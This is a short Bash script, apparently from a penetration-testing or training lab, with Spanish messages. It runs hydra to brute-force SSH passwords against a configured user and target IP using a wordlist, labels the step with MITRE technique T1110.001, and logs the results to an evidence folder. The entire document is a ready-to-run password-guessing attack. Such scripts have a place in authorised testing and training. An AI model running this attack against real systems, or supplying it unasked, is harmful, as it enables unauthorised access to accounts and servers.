#!/usr/bin/env bash
source "$(dirname "$0")/../config.sh"
echo "[T1110.001] Fuerza bruta SSH contra $SSH_USER@$TARGET_IP"
hydra -l "$SSH_USER" -P "$(dirname "$0")/../wordlists/small_list.txt" \
  ssh://"$TARGET_IP" | tee "../evidencia/02_bruteforce_$(date +%Y%m%d_%H%M).log"
